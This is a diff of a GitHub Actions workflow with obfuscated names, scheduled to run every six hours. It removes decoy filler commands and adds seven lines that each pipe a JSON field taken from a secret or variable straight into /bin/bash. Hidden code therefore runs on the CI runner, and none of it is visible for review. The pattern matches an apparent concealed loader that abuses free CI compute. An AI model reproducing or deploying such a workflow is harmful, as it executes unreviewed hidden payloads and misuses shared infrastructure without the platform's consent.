@@ -1,33 +1,22 @@
 name: yanshensu1986
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 3/6 * * *'
-
-jobs:  # 2612
+    - cron: '39 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yanshensu1986
         env:
-          b17463: ${{ secrets.b17463 }}
+          neb8: ${{ secrets.neb8 }}
         run: |
-          for i in 1 2 3; do echo "Loop $i"; done
-          echo $b17463 | jq -r .n2060 | /bin/bash
-          which wget
-          ls -al | awk '{print $NF}'
-          : ' Another single-line comment '
-          curl google.com
-          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          [ $RANDOM -gt 1000 ] && echo "Random passed"
-          which curl
-          uname -a
-          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
-          echo "Date only: $(date +%F)"
-          which apt-get
-          rm -rf tmp.temp.my.scrip.orc.zzz
-          ping -c 10 google.com
-          echo "Time: $(date +%H:%M:%S)"
+          echo $neb8 | jq -r .eg6 | /bin/bash
+          echo $smmoc05 | jq -r .yg7899 | /bin/bash
+          echo $sdwt64050 | jq -r .typev4 | /bin/bash
+          echo $y280 | jq -r .o8994 | /bin/bash
+          echo $mrx206 | jq -r .a8242 | /bin/bash
+          echo $ylbz040 | jq -r .aqwcg14 | /bin/bash
+          echo $xm5389 | jq -r .s646 | /bin/bash
+
